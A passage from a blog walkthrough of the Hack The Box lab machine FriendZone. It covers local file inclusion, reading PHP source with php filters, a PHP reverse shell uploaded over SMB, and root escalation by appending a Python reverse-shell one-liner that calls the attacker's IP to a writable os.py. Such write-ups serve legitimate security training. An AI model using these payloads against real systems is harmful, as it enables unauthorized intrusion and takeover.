+<span class="token punctuation">;</span><span class="token punctuation">;</span> WHEN: Fri Feb <span class="token number">11</span> <span class="token number">11</span>:07:08 EST <span class="token number">2022</span>
+<span class="token punctuation">;</span><span class="token punctuation">;</span> XFR size: <span class="token number">8</span> records <span class="token punctuation">(</span>messages <span class="token number">1</span>, bytes <span class="token number">289</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>put all dns zone into the hosts file</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>Kelpie💀Banshee<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/opt/HTB/FriendZone<span class="token punctuation">]</span>
+└─$ <span class="token function">cat</span> /etc/hosts
+<span class="token number">127.0</span>.0.1       localhost
+<span class="token number">127.0</span>.1.1       Leviathan
+<span class="token number">10.10</span>.10.43     nineveh.htb
+<span class="token number">10.10</span>.10.88     tartarsauce.htb
+<span class="token number">10.10</span>.10.123    friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
+<span class="token comment"># The following lines are desirable for IPv6 capable hosts</span>
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Local-file-inclusion"><a href="#Local-file-inclusion" class="headerlink" title="Local file inclusion"></a>Local file inclusion</h2><p>access the <a target="_blank" rel="noopener" href="https://administrator1.friendzone.red/">https://administrator1.friendzone.red</a> and login with the credential which we got in the smb service<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flwc9T-wnVl3B26E43gu5GatDa8b.png"><br>This site is “untested application” with some sloppy text including an error message:<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjlffnZpcrdFOQ3eox0HtmmBTq-5.png"><br>If I add the suggested parameters to the url and visit <code>[https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp](https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp)</code>:<br>Find LFI</p>
+<h4 id="pagename"><a href="#pagename" class="headerlink" title="pagename"></a>pagename</h4><p>Since the given example case is <code>timestamp</code>, and there’s a <code>timestamp.php</code> in the same directory, I can assume that this is likely doing a <code>include($_GET[&quot;pagename&quot;] . &quot;.php&quot;)</code>. I can test this by having it point to other php pages.<br>Visiting <code>[https://administrator1.friendzone.red/login.php](https://administrator1.friendzone.red/login.php)</code> returns</p>
+<h3 id="Read-PHP-Source"><a href="#Read-PHP-Source" class="headerlink" title="Read PHP Source"></a>Read PHP Source</h3><p>I can use this LFI to read source code for these pages using php filters. If I visit <code>pagename=php://filter/convert.base64-encode/resource=dashboard</code>, I can see a long base64 string on the page:<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhooceg4Wq5T6CyW1JHIUCRmpTr6.png"><br>Decoding that gives me the source for the page:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//echo "&lt;center>&lt;h2>Smart photo script for friendzone corp !&lt;/h2>&lt;/center>";</span>
+<span class="token comment">//echo "&lt;center>&lt;h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3>&lt;/center>";</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;title>FriendZone Admin !&lt;/title>"</span><span class="token punctuation">;</span>
+<span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"FriendZoneAuth"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;h2>Smart photo script for friendzone corp !&lt;/h2>&lt;/center>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3>&lt;/center>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>image_name param is missed !&lt;/p>&lt;/center>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>please enter it to show the image&lt;/p>&lt;/center>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>default is image_id=a.jpg&amp;pagename=timestamp&lt;/p>&lt;/center>"</span><span class="token punctuation">;</span>
+ <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+ <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image_id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;img src='images/<span class="token interpolation"><span class="token variable">$image</span></span>'>&lt;/center>"</span><span class="token punctuation">;</span>
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;h1>Something went worng ! , the script include wrong param !&lt;/h1>&lt;/center>"</span><span class="token punctuation">;</span>
+ <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pagename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token comment">//echo $_GET["pagename"];</span>
+ <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>You can't see the content ! , please login !&lt;/center>&lt;/p>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Get-www-data-shell"><a href="#Get-www-data-shell" class="headerlink" title="Get www-data shell"></a>Get www-data shell</h2><p>We can use the pagename to access the &#x2F;etc&#x2F;Development which directory is readable and writable for us. So we can use the smb to put the reverse-shell php file in the Development directory and use the LFI vulnerbility to get shell.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali<span class="token comment"># smbclient -N //10.10.10.123/Development</span>
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: <span class="token punctuation">\</span><span class="token operator">></span> put php-reverse-shell.php abc.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../etc/Development/abc">https://administrator1.friendzone.red/dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;Development&#x2F;abc</a><br>OK we get the initial shell as www-data</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>Kelpie💀Banshee<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/opt/HTB/FriendZone<span class="token punctuation">]</span>
+└─$ rlwrap <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4445</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4445</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.14.11<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.10.123<span class="token punctuation">]</span> <span class="token number">32850</span>
+Linux FriendZone <span class="token number">4.15</span>.0-36-generic <span class="token comment">#39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+ <span class="token number">18</span>:40:18 up  <span class="token number">2</span>:25,  <span class="token number">0</span> users,  load average: <span class="token number">0.00</span>, <span class="token number">0.00</span>, <span class="token number">0.00</span>
+<span class="token environment constant">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
+/bin/sh: <span class="token number">0</span>: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
+$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>get the friend user flag</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /home/f*/u*
+a9ed20acecd6c5b6b52f474e15ae9a11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="Privesc-to-root"><a href="#Privesc-to-root" class="headerlink" title="Privesc to root"></a>Privesc to root</h2><p>We found the root priv python file in the &#x2F;opt&#x2F;server_admin, that’ the point we can privsec by this awesome file.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-al</span> /opt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoKNaZw0JiTha8Snlmjh2EJ4AY7c.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
+<span class="token keyword">import</span> os
+to_address <span class="token operator">=</span> <span class="token string">"admin1@friendzone.com"</span>
+from_address <span class="token operator">=</span> <span class="token string">"admin2@friendzone.com"</span>
+<span class="token keyword">print</span> <span class="token string">"[+] Trying to send email to %s"</span><span class="token operator">%</span>to_address
+<span class="token comment">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span>
+<span class="token comment">#os.system(command)</span>
+<span class="token comment"># I need to edit the script later</span>
+<span class="token comment"># Sam ~ python developer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The file import the os.py file, but we can’t do any command injections with this file. There aren’t any para to input..(Damn it</p>
+<h3 id="OS-file-is-writable"><a href="#OS-file-is-writable" class="headerlink" title="OS file is writable"></a>OS file is writable</h3><p>Oh we find the python os.py is writable!</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-writable</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-ls</span> <span class="token operator">|</span> <span class="token function">grep</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs1pB9AbVSVfzsoVgQ-LoCRzRhkI.png"><br>append the reverse shell to the os.py</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>\"<span class="token number">10.10</span><span class="token number">.14</span><span class="token number">.11</span>\"<span class="token punctuation">,</span><span class="token number">4447</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="token entity" title="\&quot;">\"</span>sh<span class="token entity" title="\&quot;">\"</span>)"</span> <span class="token operator">>></span> /usr/lib/python2.7/os.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqZcPr_LDoBCtleLzNsraIQhRIGE.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjgkZT0jBVW7wHOFiu0cS4UQMG2d.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FriendZone"><span class="toc-number">1.</span> <span class="toc-text">FriendZone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scan"><span class="toc-number">3.1.</span> <span class="toc-text">Port Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Service"><span class="toc-number">3.2.</span> <span class="toc-text">SMB Service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Zone-Transfer"><span class="toc-number">3.3.</span> <span class="toc-text">DNS Zone Transfer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-file-inclusion"><span class="toc-number">3.4.</span> <span class="toc-text">Local file inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pagename"><span class="toc-number">3.4.0.1.</span> <span class="toc-text">pagename</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-PHP-Source"><span class="toc-number">3.4.1.</span> <span class="toc-text">Read PHP Source</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-www-data-shell"><span class="toc-number">3.5.</span> <span class="toc-text">Get www-data shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privesc-to-root"><span class="toc-number">3.6.</span> <span class="toc-text">Privesc to root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OS-file-is-writable"><span class="toc-number">3.6.1.</span> <span class="toc-text">OS file is writable</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[13].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&text=HTB-FriendZone"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&is_video=false&description=HTB-FriendZone"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-FriendZone&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[13].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&name=HTB-FriendZone&description=&lt;h1 id=&#34;FriendZone&#34;&gt;&lt;a href=&#34;#FriendZone&#34; class=&#34;headerlink&#34; title=&#34;FriendZone&#34;&gt;&lt;/a&gt;FriendZone&lt;/h1&gt;&lt;p&gt;Difficulty: Medium +&lt;br&gt;Score: 6.5&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[13].html&t=HTB-FriendZone"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
